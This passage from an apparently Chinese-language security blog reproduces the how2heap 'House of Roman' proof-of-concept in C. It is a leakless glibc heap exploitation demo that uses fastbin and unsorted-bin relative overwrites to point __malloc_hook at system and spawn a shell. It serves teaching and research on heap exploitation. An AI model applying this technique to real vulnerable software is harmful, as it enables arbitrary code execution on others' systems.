useful. </span></span><br><span class="line"><span class="comment">So, let&#x27;s edit this to point to the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">This way, we can get control of a function ptr.</span></span><br><span class="line"><span class="comment">To do this, we need a valid malloc size. Within the __memalign_hook </span></span><br><span class="line"><span class="comment">is usually an address that usually starts with 0x7f. </span></span><br><span class="line"><span class="comment">Because __memalign_hook value is right before this are all 0s, </span></span><br><span class="line"><span class="comment">we could use a misaligned chunk to get this to work as a valid size in </span></span><br><span class="line"><span class="comment">the 0x70 fastbin.</span></span><br><span class="line"><span class="comment">This is where the first 4 bits of randomness come into play. </span></span><br><span class="line"><span class="comment">The first 12 bits of the LibC address are deterministic for the address. </span></span><br><span class="line"><span class="comment">However, the next 4 (for a total of 2 bytes) are not. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">So, we have to brute force 2^4 different possibilities (16) </span></span><br><span class="line"><span class="comment">in order to get this in the correct location. This &#x27;location&#x27; </span></span><br><span class="line"><span class="comment">is different for each version of GLibC (should be noted).</span></span><br><span class="line"><span class="comment">After doing this relative overwrite, the fastbin looks like the following:</span></span><br><span class="line"><span class="comment">0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (__malloc_hook - 0x23).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Relatively overwrite the main_arena pointer to point to a valid </span></span><br><span class="line"><span class="comment">chunk close to __malloc_hook.</span></span><br><span class="line"><span class="comment">///// <span class="doctag">NOTE:</span> In order to make this exploit consistent </span></span><br><span class="line"><span class="comment">(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\</span></span><br><span class="line"><span class="comment">In the actual attack, this values would need to be specific </span></span><br><span class="line"><span class="comment">to a version and some of the bits would have to be brute forced </span></span><br><span class="line"><span class="comment">(depending on the bits).</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Use a relative overwrite on the main_arena pointer in the fastbin.\n\</span></span><br><span class="line"><span class="string">Point this close to __malloc_hook in order to create a fake fastbin chunk\n&quot;</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> __malloc_hook_adjust = __malloc_hook - <span class="number">0x23</span>; <span class="comment">// We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The relative overwrite</span></span><br><span class="line"><span class="type">int8_t</span> byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; </span><br><span class="line"><span class="type">int8_t</span> byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">fake_libc_chunk[<span class="number">0</span>] = byte1; <span class="comment">// Least significant bytes of the address.</span></span><br><span class="line">fake_libc_chunk[<span class="number">1</span>] = byte2; <span class="comment">// The upper most 4 bits of this must be brute forced in a real attack.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Two filler chunks prior to the __malloc_hook chunk in the fastbin. </span></span><br><span class="line"><span class="comment">// These are fastbin_victim and fake_libc_chunk.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Get the fake chunk pointing close to __malloc_hook\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">In a real exploit, this would fail 15/16 times\n\</span></span><br><span class="line"><span class="string">because of the final half byet of the malloc_hook being random\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the 4 bit brute force did not work, this will crash because </span></span><br><span class="line"><span class="comment">// of the chunk size not matching the bin for the chunk. </span></span><br><span class="line"><span class="comment">// Otherwise, the next step of the attack can begin.</span></span><br><span class="line"><span class="type">uint8_t</span>* malloc_hook_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Passed step 1 =)\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Part 2: Unsorted_bin attack </span></span><br><span class="line"><span class="comment">Now, we have control over the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">However, we do not know the address of LibC still. So, we cannot </span></span><br><span class="line"><span class="comment">do much with this attack. In order to pop a shell, we need </span></span><br><span class="line"><span class="comment">to get an address at the location of the __malloc_hook.</span></span><br><span class="line"><span class="comment">We will use the unsorted_bin attack in order to change the value </span></span><br><span class="line"><span class="comment">of the __malloc_hook with the address of main_arena + 0x68. </span></span><br><span class="line"><span class="comment">For more information on the unsorted_bin attack, review </span></span><br><span class="line"><span class="comment">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.</span></span><br><span class="line"><span class="comment">For a brief overview, the unsorted_bin attack allows us to write</span></span><br><span class="line"><span class="comment">main_arena + 0x68 to any location by altering the chunk-&gt;bk of</span></span><br><span class="line"><span class="comment">an unsorted_bin chunk. We will choose to write this to the </span></span><br><span class="line"><span class="comment">location of __malloc_hook.</span></span><br><span class="line"><span class="comment">After we overwrite __malloc_hook with the main_arena, we will </span></span><br><span class="line"><span class="comment">edit the pointer (with a relative overwrite) to point to a </span></span><br><span class="line"><span class="comment">one_gadget for immediate code execution.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Again, this relative overwrite works well but requires an additional </span></span><br><span class="line"><span class="comment">1 byte (8 bits) of brute force.</span></span><br><span class="line"><span class="comment">This brings the chances of a successful attempt up to 12 bits of </span></span><br><span class="line"><span class="comment">randomness. This has about a 1/4096 or a 0.0244% chance of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The steps for phase two of the attack are explained as we go below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Start Step 2: Unsorted_bin attack\n\n\</span></span><br><span class="line"><span class="string">The unsorted bin attack gives us the ability to write a\n\</span></span><br><span class="line"><span class="string">large value to ANY location. But, we do not control the value\n\</span></span><br><span class="line"><span class="string">This value is always main_arena + 0x68. \n\</span></span><br><span class="line"><span class="string">We point the unsorted_bin attack to __malloc_hook for a \n\</span></span><br><span class="line"><span class="string">relative overwrite later.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// Don&#x27;t want to consolidate</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Put chunk into unsorted_bin\n&quot;</span>);</span><br><span class="line"><span class="comment">// Free the chunk to create the UAF</span></span><br><span class="line"><span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* /// <span class="doctag">NOTE:</span> The last 4 bits of byte2 would have been brute forced earlier. \\\ </span></span><br><span class="line"><span class="comment"> However, for the sake of example, this has been calculated dynamically. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">__malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// This subtract 0x10 is needed because of the chunk-&gt;fd doing the actual overwrite on the unsorted_bin attack.</span></span><br><span class="line">byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; </span><br><span class="line">byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use another relative offset to overwrite the ptr of the chunk-&gt;bk pointer.</span></span><br><span class="line"><span class="comment">// From the previous brute force (4 bits from before) we </span></span><br><span class="line"><span class="comment">// know where the location of this is at. It is 5 bytes away from __malloc_hook.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Overwrite last two bytes of the chunk to point to __malloc_hook\n&quot;</span>);</span><br><span class="line">unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// Byte 0 of bk. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// //// <span class="doctag">NOTE:</span> Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///</span></span><br><span class="line">unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Trigger the unsorted bin attack.</span></span><br><span class="line"><span class="comment">This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.</span></span><br><span class="line"><span class="comment">A few things do happen though: </span></span><br><span class="line"><span class="comment">- This makes the unsorted bin (hence, small and large too) </span></span><br><span class="line"><span class="comment">   unusable. So, only allocations previously in the fastbin can only be used now.</span></span><br><span class="line"><span class="comment">- If the same size chunk (the unsorted_bin attack chunk) </span></span><br><span class="line"><span class="comment">   is NOT malloc&#x27;ed, the program will crash immediately afterwards. </span></span><br><span class="line"><span class="comment">   So, the allocation request must be the same as the unsorted_bin chunk.</span></span><br><span class="line"><span class="comment">The first point is totally fine (in this attack). But, in more complicated </span></span><br><span class="line"><span class="comment">programming, this can be an issue.</span></span><br><span class="line"><span class="comment">The second just requires us to do the same size allocaton as the current chunk.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Trigger the unsorted_bin attack\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> system_addr = (<span class="type">long</span> <span class="type">long</span>)dlsym(RTLD_NEXT, <span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Passed step 2 =)\n\n\n&quot;</span>);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Step 3: Set __malloc_hook to system</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The chunk itself is allocated 19 bytes away from __malloc_hook. </span></span><br><span class="line"><span class="comment">So, we use a realtive overwrite (again) in order to partially overwrite </span></span><br><span class="line"><span class="comment">the main_arena pointer (from unsorted_bin attack) to point to system.</span></span><br><span class="line"><span class="comment">In a real attack, the first 12 bits are static (per version). </span></span><br><span class="line"><span class="comment">But, after that, the next 12 bits must be brute forced. </span></span><br><span class="line"><span class="comment">/// <span class="doctag">NOTE:</span> For the sake of example, we will be setting these values, instead of brute forcing them. \\\</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 3: Set __malloc_hook to system/one_gadget\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\</span></span><br><span class="line"><span class="string">we can use a relative overwrite to point this to system or a one_gadget.\n\</span></span><br><span class="line"><span class="string">Note: In a real attack, this would be where the last 8 bits of brute forcing\n\</span></span><br><span class="line"><span class="string">comes from.\n&quot;</span>);</span><br><span class="line">malloc_hook_chunk[<span class="number">19</span>] = system_addr &amp; <span class="number">0xff</span>; <span class="comment">// The first 12 bits are static (per version).</span></span><br><span class="line"></span><br><span class="line">malloc_hook_chunk[<span class="number">20</span>] = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last 4 bits of this must be brute forced (done previously already).</span></span><br><span class="line">malloc_hook_chunk[<span class="number">21</span>] = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last byte is the remaining 8 bits that must be brute forced.</span></span><br><span class="line">malloc_hook_chunk[<span class="number">22</span>] = (system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>; <span class="comment">// If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.</span></span><br><span class="line"><span class="comment">// In a real example, you would probably want to use a one_gadget. </span></span><br><span class="line"><span class="comment">// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter</span></span><br><span class="line"><span class="comment">// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. </span></span><br><span class="line"><span class="comment">// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Pop Shell!&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>((<span class="type">long</span> <span class="type">long</span>)shell);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>接下来进行翻译</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE     <span class="comment">/* for RTLD_NEXT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shell = <span class="string">&quot;/bin/sh\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.</span></span><br><span class="line"><span class="comment">Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman</span></span><br><span class="line"><span class="comment">POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this in order to turn off printf buffering (messes with heap alignment)</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">The main goal of this technique is to create a **leakless** heap </span></span><br><span class="line"><span class="comment">exploitation technique in order to get a shell. This is mainly </span></span><br><span class="line"><span class="comment">done using **relative overwrites** in order to get pointers in </span></span><br><span class="line"><span class="comment">the proper locations without knowing the exact value of the pointer.</span></span><br><span class="line"><span class="comment">The first step is to get a pointer inside of __malloc_hook. This </span></span><br><span class="line"><span class="comment">is done by creating a fastbin bin that looks like the following: </span></span><br><span class="line"><span class="comment">ptr_to_chunk -&gt; ptr_to_libc. Then, we alter the ptr_to_libc</span></span><br><span class="line"><span class="comment"> (with a relative overwrite) to point to __malloc_hook. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The next step is to run an unsorted bin attack on the __malloc_hook </span></span><br><span class="line"><span class="comment">(which is now controllable from the previous attack).  Again, we run </span></span><br><span class="line"><span class="comment">the unsorted_bin attack by altering the chunk-&gt;bk with a relative overwrite. </span></span><br><span class="line"><span class="comment">Finally, after launching the unsorted_bin attack to put a libc value </span></span><br><span class="line"><span class="comment">inside of __malloc_hook, we use another relative overwrite on the </span></span><br><span class="line"><span class="comment">value of __malloc_hook to point to a one_gadget, system or some other function.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Now, the next time we run malloc we pop a shell! :) </span></span><br><span class="line"><span class="comment">However, this does come at a cost: 12 bits of randomness must be </span></span><br><span class="line"><span class="comment">brute forced (0.02% chance) of working.</span></span><br><span class="line"><span class="comment">The original write up for the *House of Roman* can be found at</span></span><br><span class="line"><span class="comment"> https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.</span></span><br><span class="line"><span class="comment">This technique requires the ability to edit fastbin and unsorted bin </span></span><br><span class="line"><span class="comment">pointers via UAF or overflow of some kind. Additionally, good control </span></span><br><span class="line"><span class="comment">over the allocations sizes and freeing is required for this technique.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* introduction = <span class="string">&quot;\nWelcome to the House of Roman\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;This is a heap exploitation technique that is LEAKLESS.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;There are three stages to the attack: \n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;1. Point a fastbin chunk to __malloc_hook.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;2. Run the unsorted_bin attack on __malloc_hook.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;3. Relative overwrite on main_arena at __malloc_hook.\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;All of the stuff mentioned above is done using two main concepts:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;relative overwrites and heap feng shui.\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;However, this technique comes at a cost:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;12-bits of entropy need to be brute forced.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;That means this technique only work 1 out of every 4096 tries or 0.02%.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n&quot;</span>;</span><br><span class="line"><span class="built_in">puts</span>(introduction);</span><br><span class="line">init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Part 1: Fastbin Chunk points to __malloc_hook</span></span><br><span class="line"><span class="comment">Getting the main_arena in a fastbin chunk ordering is the first step.</span></span><br><span class="line"><span class="comment">This requires a ton of heap feng shui in order to line this up properly. </span></span><br><span class="line"><span class="comment">However, at a glance, it looks like the following:</span></span><br><span class="line"><span class="comment">First, we need to get a chunk that is in the fastbin with a pointer to</span></span><br><span class="line"><span class="comment">a heap chunk in the fd. </span></span><br><span class="line"><span class="comment">Second, we point this chunk to a pointer to LibC (in another heap chunk). </span></span><br><span class="line"><span class="comment">All of the setup below is in order to get the configuration mentioned </span></span><br><span class="line"><span class="comment">above setup to perform the relative overwrites. &quot;;</span></span><br><span class="line"><span class="comment">Getting the pointer to libC can be done in two ways: </span></span><br><span class="line"><span class="comment">- A split from a chunk in the small/large/unsorted_bins </span></span><br><span class="line"><span class="comment">gets allocated to a size of 0x70. </span></span><br><span class="line"><span class="comment">- Overwrite the size of a small/large chunk used previously to 0x71.</span></span><br><span class="line"><span class="comment">For the sake of example, this uses the first option because it </span></span><br><span class="line"><span class="comment">requires less vulnerabilities.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 1: Point fastbin chunk to __malloc_hook\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Setting up chunks for relative overwrites with heap feng shui.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.</span></span><br><span class="line"><span class="type">uint8_t</span>* fastbin_victim = <span class="built_in">malloc</span>(<span class="number">0x60</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate this in order to have good alignment for relative </span></span><br><span class="line"><span class="comment">// offsets later (only want to overwrite a single byte to prevent </span></span><br><span class="line"><span class="comment">// 4 bits of brute on the heap).</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x100</span></span><br><span class="line"><span class="type">uint8_t</span>* main_arena_use = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x190</span></span><br><span class="line"><span class="comment">// This ptr will be used for a relative offset on the &#x27;main_arena_use&#x27; chunk</span></span><br><span class="line"><span class="type">uint8_t</span>* relative_offset_heap = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Free the chunk to put it into the unsorted_bin. </span></span><br><span class="line"><span class="comment">// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.</span></span><br><span class="line"><span class="built_in">free</span>(main_arena_use);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Get part of the unsorted_bin chunk (the one that we just freed). </span></span><br><span class="line"><span class="comment">We want this chunk because the fd and bk of this chunk will </span></span><br><span class="line"><span class="comment">contain main_arena ptrs (used for relative overwrite later).</span></span><br><span class="line"><span class="comment">The size is particularly set at 0x60 to 